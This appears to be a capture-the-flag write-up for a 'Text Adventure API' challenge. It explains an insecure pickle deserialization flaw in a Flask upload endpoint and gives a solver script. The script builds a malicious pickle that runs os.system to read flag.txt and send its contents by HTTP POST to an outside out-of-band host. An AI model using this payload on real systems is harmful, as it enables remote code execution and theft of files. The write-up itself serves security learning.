# Text Adventure API

## Solution

There is Insecure Deserialization in `/api/load` path:

```python
@app.route('/api/load', methods=['POST'])
def load_session():
    if 'file' not in request.files:
        return jsonify({"message": "No file part"})
    file = request.files['file']
    if file and file.filename.endswith('.pkl'):
        try:
            loaded_session = pickle.load(file)
            session.update(loaded_session)
```

solver.py

```python
import pickle
import os
import requests

s = requests.Session()

BASE_URL = "http://127.0.0.1:5000"
# s.proxies = {"http": "http://127.0.0.1:8080"}


class RCE:
    def __reduce__(self):
        code = "python3 -c \"import http.client; c= http.client.HTTPConnection('cmrbba52vtc000099bx0gkcfiiyyyyyyb.oast.fun'); c.request('POST', '/', open('flag.txt', 'r').read())\""
        return os.system, (code,)


def gen_pickled() -> bytes:
    pickled = pickle.dumps(RCE())

    return pickled


def main():
    pickled = gen_pickled()
    s.post(f"{BASE_URL}/api/load", files={"file": ("exploit.pkl", pickled)})


if __name__ == "__main__":
    main()
```

## References

- [Deserialization - HackTricks](https://book.hacktricks.xyz/pentesting-web/deserialization#pickle)
